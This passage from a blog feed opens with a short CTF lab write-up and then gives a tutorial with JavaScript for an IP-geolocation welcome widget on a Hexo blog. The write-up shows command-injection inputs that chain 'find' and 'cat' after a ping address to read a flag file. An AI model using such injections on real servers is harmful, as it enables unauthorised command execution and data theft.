title="Training_www_Robots"></a>Training_www_Robots</h1><p>和第二题完全一个东西，无需多言</p><h1 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h1><p><img src="/img/GFSJ10/GFSJ4.png"></p><p>题目说小宁只写了ping没开<strong>waf（web application firewall）</strong>，那就可以通过在<br>ping命令后面夹带东西来获取shell的写入权限，可以直接把输入框当作shell输入<br>界面（只不过它提前帮你输入了ping四个字母）。</p><p><strong>新知识：命令拼接：</strong> |的作用为将前一个命令的结果传递给后一个命令作为输入，&amp;&amp;的作用是前一条命令执行成功时，才执行后一条命令</p><p>直接用127.0.0.1 &amp;&amp; find &#x2F;-name flag.txt，成功，系统返回告诉我：&#x2F;home&#x2F;flag.txt，剩下的就不用多说了。-最后直接输入：127.0.0.1 &amp;&amp; cat &#x2F;home&#x2F;flag.txt，服务器直接就flag的内容返回给我们了。</p>]]></content>
      
      
      <categories>
          
          <category> 一个web蒟蒻的成长日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客折腾日记（二）：hexo butterfly主题添加定位欢迎语（避坑详细教程）</title>
      <link href="/2024/12/06/%E5%8D%9A%E5%AE%A2%E6%8A%98%E8%85%BE%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89%E6%B7%BB%E5%8A%A0%E5%B0%8F%E7%BB%84%E4%BB%B6/"/>
      <url>/2024/12/06/%E5%8D%9A%E5%AE%A2%E6%8A%98%E8%85%BE%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89%E6%B7%BB%E5%8A%A0%E5%B0%8F%E7%BB%84%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>写这篇博客是因为我在参考fomalhaut大佬的教程的时候，发现所用到的腾讯定位工具是2023的版本，已经过时，所以自己重新钻研了一下。</p><p>原教程点这里：<a href="https://www.fomal.cc/posts/d739261b.html#%E6%AC%A2%E8%BF%8E%E4%BF%A1%E6%81%AF%E6%98%BE%E7%A4%BA%E5%9C%B0%E7%90%86%E4%BD%8D%E7%BD%AE" title="教程">欢迎信息显示地理位置</a></p><h1 id="注册并配置腾讯定位工具"><a href="#注册并配置腾讯定位工具" class="headerlink" title="注册并配置腾讯定位工具"></a>注册并配置腾讯定位工具</h1><p>先在腾讯定位工具中注册，然后进入“我的应用”，点击“创建应用”，应用名称和类型随便填。在新创建的应用中点击添加key，key的名称也是随便起一个就行，产品选择WebServiceAPI，域名白名单填自己的域名和localhost，把得到的key记下。如下图：</p><p><img src="/img/location/location1.png"></p><p><img src="/img/location/location0.png"></p><p>这里有几个注意点：</p><p>第一就是上面说的加上localhost是指加上localhost:4000，因为我们预览博客的时候是使用hexo s在本地进行预览，端口是localhost:4000，所以要把这个地址加进白名单</p><p>第二就是填写我们的域名的时候<strong>一定要填小写</strong>，不要填大写，比如说我的网名是Z41sArrebol，域名我自然也想写Z41sArrebol.top，但是你会发现输到浏览器会变成小写的z41sarrebol.top，这样的话我们填白名单的域名就要写小写，否则就会出问题。</p><p>第三就是在创建应用完成后我们点击左侧的“配额管理”，进入“账户额度”界面，我们会发现有一个“ip定位”的选项，如下图所示：</p><p><img src="/img/location/location2.png"></p><p>点击右侧的“配额分配”，把调用分配全部点满即可，对于我们的小网站，一天10000次绝对够用了，其他的不需要点，配额结束之后保存即可。</p><p>（一开始我怎么刷新都没有效果，组件一直都是一个黑色的长条，后来才发现要手动配置ip定位的额度）</p><p><img src="/img/location/location3.png"></p><p>OK现在我们已经完成了这个定位工具的配置，我们返回首页“我的应用，会看到一个6*5的key，我们保存下来一会要用到。</p><h1 id="各种文件的配置"><a href="#各种文件的配置" class="headerlink" title="各种文件的配置"></a>各种文件的配置</h1><h2 id="JS文件的引入"><a href="#JS文件的引入" class="headerlink" title="JS文件的引入"></a>JS文件的引入</h2><p>新建[BlogRoot]\source\js\txmap.js，并写入如下代码，记住替换<strong>key的内容</strong>和<strong>你的经纬度</strong>，欢迎信息也可以自己改：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//get请求</span></span><br><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;get&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;https://apis.map.qq.com/ws/location/v1/ip&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">key</span>: <span class="string">&#x27;*****-*****-*****-*****-*****-*****&#x27;</span>,  <span class="comment">//这里进行替换</span></span><br><span class="line">        <span class="attr">output</span>: <span class="string">&#x27;jsonp&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">dataType</span>: <span class="string">&#x27;jsonp&#x27;</span>,</span><br><span class="line">    <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">        ipLoacation = res;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(ipLoacation);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getDistance</span>(<span class="params">e1, n1, e2, n2</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> R = <span class="number">6371</span></span><br><span class="line">    <span class="keyword">const</span> &#123; sin, cos, asin, <span class="variable constant_">PI</span>, hypot &#125; = <span class="title class_">Math</span></span><br><span class="line">    <span class="keyword">let</span> <span class="title function_">getPoint</span> = (<span class="params">e, n</span>) =&gt; &#123;</span><br><span class="line">        e *= <span class="variable constant_">PI</span> / <span class="number">180</span></span><br><span class="line">        n *= <span class="variable constant_">PI</span> / <span class="number">180</span></span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">x</span>: <span class="title function_">cos</span>(n) * <span class="title function_">cos</span>(e), <span class="attr">y</span>: <span class="title function_">cos</span>(n) * <span class="title function_">sin</span>(e), <span class="attr">z</span>: <span class="title function_">sin</span>(n) &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> a = <span class="title function_">getPoint</span>(e1, n1)</span><br><span class="line">    <span class="keyword">let</span> b = <span class="title function_">getPoint</span>(e2, n2)</span><br><span class="line">    <span class="keyword">let</span> c = <span class="title function_">hypot</span>(a.<span class="property">x</span> - b.<span class="property">x</span>, a.<span class="property">y</span> - b.<span class="property">y</span>, a.<span class="property">z</span> - b.<span class="property">z</span>)</span><br><span class="line">    <span class="keyword">let</span> r = <span class="title function_">asin</span>(c / <span class="number">2</span>) * <span class="number">2</span> * R</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">round</span>(r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showWelcome</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> dist = <span class="title function_">getDistance</span>(<span class="number">118.93386159</span>, <span class="number">32.11099864</span>, ipLoacation.<span class="property">result</span>.<span class="property">location</span>.<span class="property">lng</span>, ipLoacation.<span class="property">result</span>.<span class="property">location</span>.<span class="property">lat</span>); <span class="comment">//这里换成自己的经纬度</span></span><br><span class="line">    <span class="keyword">let</span> pos = ipLoacation.<span class="property">result</span>.<span class="property">ad_info</span>.<span class="property">nation</span>;</span><br><span class="line">    <span class="keyword">let</span> ip;</span><br><span class="line">    <span class="keyword">let</span> posdesc;</span><br><span class="line">    <span class="comment">//根据国家、省份、城市信息自定义欢迎语</span></span><br><span class="line">    <span class="keyword">switch</span> (ipLoacation.<span class="property">result</span>.<span class="property">ad_info</span>.<span class="property">nation</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;日本&quot;</span>:</span><br><span class="line">            posdesc = <span class="string">&quot;よろしく，一起去看樱花吗&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;美国&quot;</span>:</span><br><span class="line">            posdesc = <span class="string">&quot;Let us live in peace!&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;英国&quot;</span>:</span><br><span class="line">            posdesc = <span class="string">&quot;想同你一起夜乘伦敦眼&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;俄罗斯&quot;</span>:</span><br><span class="line">            posdesc = <span class="string">&quot;干了这瓶伏特加！&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;法国&quot;</span>:</span><br><span class="line">            posdesc = <span class="string">&quot;C&#x27;est La Vie&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;德国&quot;</span>:</span><br><span class="line">            posdesc = <span class="string">&quot;Die Zeit verging im Fluge.&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;澳大利亚&quot;</span>:</span><br><span class="line">            posdesc = <span class="string">&quot;一起去大堡礁吧！&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;加拿大&quot;</span>:</span><br><span class="line">            posdesc = <span class="string">&quot;拾起一片枫叶赠予你&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;中国&quot;</span>:</span><br><span class="line">            pos = ipLoacation.<span class="property">result</span>.<span class="property">ad_info</span>.<span class="property">province</span> + <span class="string">&quot; &quot;</span> + ipLoacation.<span class="property">result</span>.<span class="property">ad_info</span>.<span class="property">city</span> + <span class="string">&quot; &quot;</span> + ipLoacation.<span class="property">result</span>.<span class="property">ad_info</span>.<span class="property">district</span>;</span><br><span class="line">            ip = ipLoacation.<span class="property">result</span>.<span class="property">ip</span>;</span><br><span class="line">            <span class="keyword">switch</span> (ipLoacation.<span class="property">result</span>.<span class="property">ad_info</span>.<span class="property">province</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;北京市&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;北——京——欢迎你~~~&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;天津市&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;讲段相声吧。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;河北省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;山势巍巍成壁垒，天下雄关。铁马金戈由此向，无限江山。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;山西省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;展开坐具长三尺，已占山河五百余。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;内蒙古自治区&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;天苍苍，野茫茫，风吹草低见牛羊。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;辽宁省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;请我吃烤鸡架！&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;吉林省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;状元阁就是东北烧烤之王。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;黑龙江省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;带我去冰雪大世界吧hhhh。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;上海市&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;众所周知，中国只有两个城市。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;江苏省&quot;</span>:</span><br><span class="line">                    <span class="keyword">switch</span> (ipLoacation.<span class="property">result</span>.<span class="property">ad_info</span>.<span class="property">city</span>) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&quot;南京市&quot;</span>:</span><br><span class="line">                            posdesc = <span class="string">&quot;看来我们离得还挺近嗷！&quot;</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&quot;苏州市&quot;</span>:</span><br><span class="line">                            posdesc = <span class="string">&quot;上有天堂，下有苏杭。&quot;</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="attr">default</span>:</span><br><span class="line">                            posdesc = <span class="string">&quot;散装是必须要散装的（doge）&quot;</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;浙江省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;东风渐绿西湖柳，雁已还人未南归。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;河南省&quot;</span>:</span><br><span class="line">                    <span class="keyword">switch</span> (ipLoacation.<span class="property">result</span>.<span class="property">ad_info</span>.<span class="property">city</span>) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&quot;郑州市&quot;</span>:</span><br><span class="line">                            posdesc = <span class="string">&quot;豫州之域，天地之中。&quot;</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&quot;南阳市&quot;</span>:</span><br><span class="line">                            posdesc = <span class="string">&quot;臣本布衣，躬耕于南阳。此南阳非彼南阳！&quot;</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&quot;驻马店市&quot;</span>:</span><br><span class="line">                            posdesc = <span class="string">&quot;峰峰有奇石，石石挟仙气。&quot;</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&quot;开封市&quot;</span>:</span><br><span class="line">                            posdesc = <span class="string">&quot;刚正不阿包青天。&quot;</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&quot;洛阳市&quot;</span>:</span><br><span class="line">                            posdesc = <span class="string">&quot;洛阳牡丹甲天下。&quot;</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="attr">default</span>:</span><br><span class="line">                            posdesc = <span class="string">&quot;可否带我品尝河南烩面啦？&quot;</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;安徽省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;蚌埠住了，芜湖起飞！&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;福建省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;井邑白云间，岩城远带山。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;江西省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;落霞与孤鹜齐飞，秋水共长天一色。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;山东省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;遥望齐州九点烟，一泓海水杯中泻。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;湖北省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;请我吃碗热干面！&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;湖南省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;74751，长沙斯塔克。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;广东省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;老板来两斤福建人。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;广西壮族自治区&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;桂林山水甲天下。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;海南省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;朝观日出逐白浪，夕看云起收霞光。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;四川省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;请我吃火锅！（doge）&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;贵州省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;茅台，学生，再塞200。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;云南省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;玉龙飞舞云缠绕，万仞冰川直耸天。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;西藏自治区&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;躺在茫茫草原上，仰望蓝天。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;陕西省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;给我来份臊子面加馍！&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;甘肃省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;羌笛何须怨杨柳，春风不度玉门关。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;青海省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;你们那的牛肉干和老酸奶肯定很好吃！&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;宁夏回族自治区&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;大漠孤烟直，长河落日圆。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;新疆维吾尔自治区&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;驼铃古道丝绸路，胡马犹闻唐汉风。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;台湾省&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;我在这头，大陆在那头。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;香港特别行政区&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;永定贼有残留地鬼嚎，迎击光非岁玉。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;澳门特别行政区&quot;</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;性感荷官，在线发牌。&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="attr">default</span>:</span><br><span class="line">                    posdesc = <span class="string">&quot;带我去你的城市逛逛吧！&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            posdesc = <span class="string">&quot;带我去你的国家逛逛吧。&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据本地时间切换欢迎语</span></span><br><span class="line">    <span class="keyword">let</span> timeChange;</span><br><span class="line">    <span class="keyword">let</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">    <span class="keyword">if</span> (date.<span class="title function_">getHours</span>() &gt;= <span class="number">5</span> &amp;&amp; date.<span class="title function_">getHours</span>() &lt; <span class="number">11</span>) timeChange = <span class="string">&quot;&lt;span&gt;上午好&lt;/span&gt;，一日之计在于晨！&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (date.<span class="title function_">getHours</span>() &gt;= <span class="number">11</span> &amp;&amp; date.<span class="title function_">getHours</span>() &lt; <span class="number">13</span>) timeChange = <span class="string">&quot;&lt;span&gt;中午好&lt;/span&gt;，该摸鱼吃午饭了。&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (date.<span class="title function_">getHours</span>() &gt;= <span class="number">13</span> &amp;&amp; date.<span class="title function_">getHours</span>() &lt; <span class="number">15</span>) timeChange = <span class="string">&quot;&lt;span&gt;下午好&lt;/span&gt;，懒懒地睡个午觉吧！&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (date.<span class="title function_">getHours</span>() &gt;= <span class="number">15</span> &amp;&amp; date.<span class="title function_">getHours</span>() &lt; <span class="number">16</span>) timeChange = <span class="string">&quot;&lt;span&gt;三点几啦&lt;/span&gt;，一起饮茶呀！&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (date.<span class="title function_">getHours</span>() &gt;= <span class="number">16</span> &amp;&amp; date.<span class="title function_">getHours</span>() &lt; <span class="number">19</span>) timeChange = <span class="string">&quot;&lt;span&gt;夕阳无限好！&lt;/span&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (date.<span class="title function_">getHours</span>() &gt;= <span class="number">19</span> &amp;&amp; date.<span class="title function_">getHours</span>() &lt; <span class="number">24</span>) timeChange = <span class="string">&quot;&lt;span&gt;晚上好&lt;/span&gt;，夜生活嗨起来！&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> timeChange = <span class="string">&quot;夜深了，早点休息，少熬夜。&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//自定义文本和需要放的位置</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;welcome-info&quot;</span>).<span class="property">innerHTML</span> =</span><br><span class="line">            <span class="string">`&lt;b&gt;&lt;center&gt;🎉 欢迎信息 🎉&lt;/center&gt;&amp;emsp;&amp;emsp;欢迎来自 &lt;span style=&quot;color:var(--theme-color)&quot;&gt;<span class="subst">$&#123;pos&#125;</span>&lt;/span&gt; 的小伙伴，<span class="subst">$&#123;timeChange&#125;</span>您现在距离站长约 &lt;span style=&quot;color:var(--theme-color)&quot;&gt;<span class="subst">$&#123;dist&#125;</span>&lt;/span&gt; 公里，您当前的IP地址为（可能为ipv4/6格式）： &lt;span style=&quot;color:var(--theme-color)&quot;&gt;<span class="subst">$&#123;ip&#125;</span>&lt;/span&gt;， <span class="subst">$&#123;posdesc&#125;</span>&lt;/b&gt;`</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="comment">// console.log(&quot;Pjax无法获取#welcome-info元素🙄🙄🙄&quot;)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable 